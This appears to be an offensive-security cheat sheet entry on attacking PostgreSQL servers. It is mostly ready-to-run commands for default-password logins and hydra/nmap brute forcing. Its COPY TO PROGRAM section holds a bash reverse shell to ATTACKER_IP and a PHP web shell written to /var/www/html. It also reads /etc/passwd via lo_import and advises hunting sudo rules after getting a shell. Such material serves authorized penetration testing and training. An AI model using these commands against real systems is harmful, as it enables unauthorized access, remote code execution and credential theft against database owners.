---
id: postgresql-enum
title: PostgreSQL Enumeration
stage: enumeration
tags: [windows, linux]
tools:
  - psql -h $TARGET -U postgres
  - nmap -p5432 --script pgsql-brute $TARGET
  - hydra -L users.txt -P passwords.txt postgres://$TARGET
leads_to: [sqli-rce, rev-shell, public-exploit]
summary: Enumerate PostgreSQL databases and escalate to OS command execution via COPY TO PROGRAM.
---

## Connect

```bash
psql -h $TARGET -U postgres        # try with no password
psql -h $TARGET -U postgres -W     # prompt for password
PGPASSWORD=postgres psql -h $TARGET -U postgres
```

## Brute Force

```bash
nmap -p5432 --script pgsql-brute $TARGET
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
  -P /usr/share/wordlists/rockyou.txt postgres://$TARGET
```

## Enumeration Once Connected

```sql
\l                                        -- list databases
\c dbname                                 -- switch database
\dt                                       -- list tables
SELECT current_user;
SELECT version();
SELECT rolname, rolsuper FROM pg_roles;   -- identify superusers
SELECT table_name FROM information_schema.tables WHERE table_schema='public';
```

## RCE via COPY TO PROGRAM (Superuser)

PostgreSQL 9.3+ superusers can execute OS commands:

```sql
-- Check if superuser
SELECT current_setting('is_superuser');

-- Execute OS command
COPY (SELECT '') TO PROGRAM 'id';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';

-- Write web shell if web root is known
COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php';
```

## Large Object File Read (Any Authenticated User)

```sql
SELECT lo_import('/etc/passwd');     -- returns OID
SELECT lo_get(<OID>);
```

## Notes

- Default port 5432; sometimes 5433
- `postgres` superuser often has no password or weak default — try before brute forcing
- `COPY TO PROGRAM` requires superuser; `lo_import` works for any DB user with read permission on the file
- Check `pg_hba.conf` for `trust` entries allowing passwordless access from certain IPs
- On Linux: `postgres` OS user can often `sudo su` or has sudo rules — check after getting shell
